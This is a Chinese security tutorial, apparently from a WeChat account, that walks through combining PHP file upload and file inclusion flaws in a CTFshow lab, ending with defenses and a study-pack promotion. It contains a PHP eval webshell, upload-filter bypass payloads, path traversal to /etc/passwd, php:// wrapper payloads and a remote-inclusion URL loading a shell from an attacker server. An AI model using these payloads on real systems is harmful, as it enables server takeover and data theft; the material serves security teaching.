#  第4期：Web漏洞挖掘进阶｜文件上传与文件包含漏洞组合利用实战  
原创 龙哥网络安全
                    龙哥网络安全  龙哥网络安全   2026-02-07 01:41  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/8cylv3yeUGZILFlwwDjiabNv53dP4oHJafAzicMibsia9XytLRiaOFVQLh5mib5KecHTEeIANHFLHH3qwORHAhaJ9rQoRmFNpAM3Os6DMrk5Botcw/640?wx_fmt=jpeg "")  
  
  
前言  
  
文件上传与文件包含漏洞是Web漏洞中危害极高的两类进阶漏洞，二者常组合出现，也是CTF Web模块中“getshell”  
的核心途径。文件上传漏洞的核心是“服务器未对上传文件进行严格校验，允许恶意脚本文件上传”  
；文件包含漏洞的核心是“服务器未对包含的文件路径进行严格校验，允许包含恶意文件”  
，二者结合可直接获取服务器权限，实战中危害极大。  
  
本文将从底层成因出发，分别拆解文件上传、文件包含漏洞的原理、分类、挖掘流程，重点讲解两类漏洞的组合利用技巧，结合CTFshow靶场实战，覆盖文件上传过滤绕过、文件包含路径遍历与恶意文件加载，同时补充防护方案，适合Web安全进阶学习者、CTF爱好者、初级渗透测试工程师阅读，需具备基础的Web开发知识与PHP文件操作基础。  
## 一、文件上传漏洞底层原理与核心成因  
  
文件上传漏洞是“服务器文件操作漏洞”，核心成因是“用户上传的文件未被严格校验，恶意脚本文件被上传到服务器并可被访问执行”。绝大多数Web应用都有文件上传功能（如头像上传、附件上传、论坛发帖上传），若校验逻辑存在缺陷，就会触发漏洞。  
1. 漏洞代码示例（PHP）  
  
```
<?php
// 接收上传的文件
$file = $_FILES['file'];
// 获取文件名与上传路径
$filename = $file['name'];
$uploadDir = './upload/';
$uploadFile = $uploadDir . $filename;
// 直接上传文件（未做任何校验）
if (move_uploaded_file($file['tmp_name'], $uploadFile)) {
    echo "文件上传成功，路径：" . $uploadFile;
} else {
    echo "文件上传失败";
}
?>

```  
1. 漏洞触发过程  
  
当用户上传正常图片文件（如1.jpg）  
时，文件会被保存到./upload/1.jpg  
，访问该路径仅会展示图片，无异常；当用户上传恶意PHP脚本文件（如shell.php，内容为<?php @eval($_POST['cmd']);?>）  
时，文件会被保存到./upload/shell.php  
，访问该路径后，可通过POST请求传递cmd参数，执行系统命令（如cmd=system('whoami');），实现getshell。  
1. 核心成因总结  
  
文件上传漏洞的触发需满足3个核心条件：  
- 上传可控：用户可以控制上传的文件内容与文件名。  
  
- 未做校验：服务器未对文件的类型、后缀、内容、大小进行严格校验，或校验逻辑存在缺陷。  
  
- 可访问执行：上传的恶意文件被保存到可访问的路径，且服务器支持该类型文件的执行（如PHP服务器支持.php文件执行）。  
  
1. 常见校验方式与缺陷  
  
开发者常会通过以下4种方式校验上传文件，每种方式都存在对应的缺陷，也是漏洞挖掘的突破口：  
## 二、文件包含漏洞底层原理与核心成因  
  
文件包含漏洞是“服务器文件引入漏洞”，核心成因是“服务器使用文件包含函数（如PHP的include()、require()）引入文件时，未对文件路径进行严格校验，允许用户控制路径参数，从而包含恶意文件”。该漏洞多出现于使用框架开发、多模块复用的Web应用中。  
1. 漏洞代码示例（PHP）  
  
```
<?php
// 接收用户控制的文件路径参数
$file = $_GET['file'];
// 包含文件（未对路径进行校验）
include($file);
?>

```  
1. 漏洞触发过程  
  
当用户传入合法路径（file=./index.php）  
时，服务器会包含并执行index.php  
文件，无异常；当用户传入恶意文件路径（file=./upload/shell.php）  
时，服务器会包含并执行shell.php文件，若该文件是恶意脚本，即可实现getshell；此外，还可通过路径遍历（如file=../../etc/passwd）读取服务器系统文件。  
1. 核心成因总结  
  
文件包含漏洞的触发需满足2个核心条件：  
- 路径可控：用户可以控制文件包含函数的路径参数。  
  
- 未做校验：服务器未对路径参数进行严格校验，允许包含任意文件（本地文件、远程文件）。  
  
1. 核心分类  
  
根据包含的文件来源，文件包含漏洞可分为2类，实战中需针对性挖掘：  
- 本地文件包含（LFI）：包含服务器本地的文件，可用于读取系统文件、执行本地恶意脚本（如上传的shell文件），最常见。  
  
- 远程文件包含（RFI）：包含远程服务器上的恶意文件，需服务器开启allow_url_include=On（PHP配置），危害更大，可直接包含远程恶意脚本getshell。  
  
## 三、两类漏洞组合利用流程（CTFshow靶场实战）  
  
文件上传与文件包含漏洞单独存在时，危害有限（如上传的恶意文件无法执行、文件包含无恶意文件可包含），二者组合是实战中getshell的核心思路：上传恶意脚本文件→通过文件包含漏洞加载执行该文件。本文以CTFshow Web进阶第20题为例，拆解完整组合利用流程。  
1. 靶场环境与信息收集  
  
- 靶场地址：http://xxx.ctfshow.com/?file=index.php，存在文件包含参数file。  
  
- 功能判断：页面存在文件上传入口（头像上传），支持上传文件。  
  
- 初步探测：传入file=../../etc/passwd  
，页面显示系统文件内容，确认存在本地文件包含漏洞；尝试上传.php文件，提示“仅允许上传图片文件”，说明存在文件上传过滤。  
  
1. 步骤1：文件上传（绕过过滤，上传恶意脚本）  
  
目标仅允许上传图片文件，需绕过后端Content-Type与文件内容校验，上传恶意PHP脚本：  
- 步骤1-1：构造恶意脚本文件（shell.php），内容为一句话木马：  
```
  <?php @eval($_POST['cmd']);?>

```  
  
  
- 步骤1-2：添加图片头部，伪装成jpg文件（绕过文件内容校验）：用记事本打开shell.php，在头部添加jpg文件标识“FFD8FF”（十六进制）  
，保存为shell.jpg.php  
（后缀混淆，绕过文件名校验）；  
  
- 步骤1-3：篡改Content-Type  
，绕过类型校验：开启Burp，抓取上传请求，将Content-Type  
改为image/jpeg  
；  
  
- 步骤1-4：提交上传，获取文件路径：上传成功后，页面返回文件路径为`./upload/shell.jpg.php。  
  
1. 步骤2：文件包含（加载执行恶意脚本）  
  
利用文件包含漏洞，加载上传的恶意文件，实现getshell：  
- 步骤2-1：构造文件包含URL，传入恶意文件路径：  
```
  http://xxx.ctfshow.com/?file=./upload/shell.jpg.php

```  
  
  
- 步骤2-2：验证脚本执行：使用中国蚁剑连接该URL，密码为cmd（对应一句话木马中的$_POST['cmd']）  
，连接成功后，可执行系统命令、读取Flag，完成getshell。  
  
1. 拓展：远程文件包含利用（RFI）  
  
若目标服务器开启allow_url_include=On，可直接包含远程恶意脚本，无需上传文件：  
- 步骤1：在自己的服务器上创建恶意脚本（shell.php），内容为一句话木马；  
  
- 步骤2：构造远程文件包含URL：  
```
  http://xxx.ctfshow.com/?file=http://自己的服务器IP/shell.php

```  
  
  
- 步骤3：使用蚁剑连接该URL，即可getshell。  
  
## 四、文件上传过滤绕过技巧（实战重点）  
  
文件上传的核心挖掘难点是“绕过服务器校验”  
，结合实战场景，整理6种常用绕过技巧，覆盖绝大多数过滤场景。  
1. 后缀名绕过  
  
针对后端文件名后缀校验，常用以下3种方式：  
- 后缀混淆：使用服务器支持的非标准脚本后缀，如PHP服务器支持.php5、.phtml、.php3、.php.bak  
，上传shell.php5，服务器会当作PHP文件执行；  
  
- 大小写混淆：如上传shell.PhP，绕过区分大小写的后缀校验；  
  
- 空格/点绕过：Windows系统中，文件名末尾的空格或点会被忽略，如上传shell.php.（末尾加.）、shell.php （末尾加空格），保存后会自动变为shell.php。  
  
1. Content-Type绕过  
  
针对后端Content-Type校验，直接通过Burp篡改请求头即可：  
- 上传PHP文件时，将请求头中Content-Type改为合法图片类型（image/jpeg、image/png、image/gif）  
；  
  
- 示例：抓取上传请求，修改Content-Type: image/jpeg  
，提交即可绕过。  
  
1. 文件内容绕过  
  
针对文件头部校验（判断文件类型），通过添加合法文件头部伪装即可：  
- 图片文件头部：jpg（FFD8FF）、png（89504E47）、gif（47494638）  
，可通过十六进制编辑器添加，或直接在脚本前添加图片二进制内容；  
  
- 示例：在一句话木马前添加gif头部内容“GIF89a”  
，保存为shell.gif，上传后通过文件包含执行。  
  
1. 前端校验绕过  
  
针对前端JS文件名校验，有2种简单绕过方式：  
- 禁用浏览器JS：浏览器按F12，打开开发者工具，禁用JS（设置→调试器→禁用JavaScript），再上传恶意文件；  
  
- 修改JS代码：抓取上传请求前，修改前端JS中的后缀校验逻辑，删除对.php等脚本后缀的限制。  
  
1. 截断绕过  
  
针对路径拼接校验（如服务器自动添加图片后缀），可通过截断符截断文件名，示例：  
- 若服务器会自动给上传文件添加.jpg后缀，上传shell.php%00  
，%00是NULL截断符，服务器会截断后面的内容，保存为shell.php；  
  
- 注意：仅适用于PHP版本<5.3.4，高版本PHP已修复该漏洞。  
  
1. .user.ini绕过（PHP特有）  
  
若目标禁止上传.php文件，但允许上传.ini文件，可通过.user.ini  
文件篡改PHP配置，让服务器解析指定文件为PHP：  
- 步骤1：创建.user.ini  
文件，内容为：auto_prepend_file=shell.jpg  
（指定加载shell.jpg文件）；  
  
- 步骤2：上传.user.ini与shell.jpg（shell.jpg中包含PHP一句话木马）；  
  
- 步骤3：访问任意PHP文件，服务器会自动加载shell.jpg并解析为PHP，实现getshell。  
  
## 五、文件包含漏洞绕过技巧（实战重点）  
  
文件包含的核心挖掘难点是“绕过路径校验”，常用以下4种绕过技巧，应对不同校验场景。  
1. 路径遍历绕过  
  
针对限制包含本地文件路径的场景，通过../（上级目录）遍历到目标文件路径：  
```
# 遍历到根目录，读取系统文件
file=../../../../etc/passwd

# 遍历到上传目录，包含恶意文件
file=../../upload/shell.php

```  
> 补充：若服务器过滤../，可使用..././、....//等变形路径，或编码绕过（../编码为%2E%2E%2F）。  
  
1. 截断绕过  
  
针对服务器自动添加文件后缀的场景（如file=xxx自动拼接为file=xxx.php），使用截断符截断后缀：  
```
# NULL截断（PHP<5.3.4）
file=./upload/shell.jpg%00

# 路径长度截断（Windows）
file=./upload/shell.jpgaaaaaaaaa...（重复多个a，达到路径长度限制，自动截断后续拼接内容）


```  
1. 伪协议绕过（PHP特有）  
  
PHP支持多种伪协议，可用于绕过后端路径校验，读取文件或执行代码，常用2种：  
- php://filter伪协议：用于读取文件内容，示例：  
```
  file=php://filter/read=convert.base64-encode/resource=../../etc/passwd将文件内容转为Base64编码，解码后即可获取原文，适合读取PHP文件（避免被执行）。

```  
  
  
- php://input伪协议：用于执行POST请求中的代码，需开启allow_url_include=On，示例：  
```
  file=php://inputPOST请求体中传入PHP代码（<?php phpinfo();?>），服务器会执行该代码。

```  
  
  
1. 远程文件包含绕过  
  
针对限制本地文件包含的场景，若服务器开启allow_url_include=On，可直接包含远程文件，或通过以下方式绕过限制：  
- 编码绕过：将远程文件URL进行URL编码，绕过关键词过滤（如http://）；  
  
- IP进制转换：将远程服务器IP转为十进制/八进制，绕过IP过滤，示例：127.0.0.1转为十进制为2130706433，URL为http://2130706433/shell.php。  
  
## 六、防护方案（攻防兼备）  
1. 文件上传漏洞防护（核心）  
  
- 严格校验文件后缀：采用“白名单”机制，仅允许jpg、png、gif等合法后缀，禁止所有脚本后缀（包括非标准后缀）。  
  
- 多重内容校验：校验文件头部标识、文件大小、文件内容，禁止包含脚本代码的文件。  
  
- 修改文件名与存储路径：上传后随机生成文件名（如UUID），避免用户控制文件名；将上传文件存储到非Web访问目录，或禁止该目录的脚本执行权限。  
  
- 禁用前端校验依赖：前端校验仅作为辅助，核心校验逻辑放在后端，避免前端代码被篡改。  
  
1. 文件包含漏洞防护（核心）  
  
- 严格校验路径参数：采用“白名单”机制，仅允许包含指定目录的指定文件，禁止用户控制完整路径。  
  
- 禁用危险配置：PHP中关闭allow_url_include=Off，禁止远程文件包含。  
  
- 过滤危险字符：过滤../、http://、ftp://等危险字符，防止路径遍历与远程包含。  
  
- 限制文件包含范围：将包含的文件限制为本地文件，禁止包含远程文件与系统敏感文件。  
  
## 七、新手避坑指南（核心6点）  
- 避坑1：上传恶意文件后，未确认文件路径与执行权限。部分场景下，文件虽上传成功，但路径不可访问或无执行权限，无法利用；  
  
- 避坑2：忽视服务器环境差异。不同服务器（Apache/Nginx/IIS）对脚本后缀的支持不同，如IIS支持.asp、.aspx后缀，需针对性构造payload；  
  
- 避坑3：盲目使用截断绕过。截断漏洞仅存在于低版本PHP，高版本中无效，需先探测PHP版本；  
  
- 避坑4：文件包含时，混淆本地与远程包含的配置要求。远程包含需开启allow_url_include=On，本地包含无需；  
  
- 避坑5：忽视.user.ini文件的利用场景。当无法上传.php文件时，可尝试上传.user.ini配合图片木马绕过；  
  
- 避坑6：过度依赖工具，忽视手动构造payload。实战中过滤规则多样，需根据校验逻辑灵活调整绕过方法，工具无法覆盖所有场景。  
  
全是能直接用的干货：点击链接就能拿到！  
  
[有了这个资源，网安技术学不会你找我！](https://mp.weixin.qq.com/s?__biz=MzU3MjczNzA1Ng==&mid=2247499507&idx=1&sn=b3342a568d226df231f7a371f8e5a0d5&scene=21#wechat_redirect)  
  
  
  
想要入行黑客&网络安全的朋友，给大家准备了一份：282G全网最全的网络安全资料包免费领取。  
  
  
关注我，到我公众呺主页发送“学习”或者“黑客”，就能领取到视频教程，我都可以免费分享给大家哦！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/7O8nPRxfRT6lk3oXDrx8qaZiaMDS5XHTATLezRmc0A6yBIw1wmpib4hbgAiaK7CmtV0jMMle98QxC74LPEQhjzqOw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4 "")  
  
从0到进阶的全套网安教程  
  
[有了这个资源，网安技术学不会你找我！](https://mp.weixin.qq.com/s?__biz=MzU3MjczNzA1Ng==&mid=2247499507&idx=1&sn=b3342a568d226df231f7a371f8e5a0d5&scene=21#wechat_redirect)  
  
  
  
可以截图或者直接扫码添加找我拿  
  
**龙哥网络安全**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/7O8nPRxfRT6lk3oXDrx8qaZiaMDS5XHTADAVDxfT8IlribxZgSN0pTxbRpJsKxHdlsu8vpFTfxSkMuibcRiaIckebg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&watermark=1&tp=webp#imgIndex=5 "")  
  
  
**扫码添加领取**  
  
  
**点击蓝字**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ibxqJibmt337FAiaWRcQtUgyiak5dz81n37puYvXjff5AofqGAkjClzzyg4jcUgDucuKloOlGmF8ibYqYQeNHecpezA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
**关注我**  
  
[#黑客技术]()  
[#挖漏洞]()  
[#技术分享]()  
[#网络工程师]()  
[#零基础小白学黑客技术]()  
[#信息安全]()  
[#CTF]()  
[#网安技术]()  
[#计算机专业]()  
[#转行网络安全]()  
  
  
  
  
  
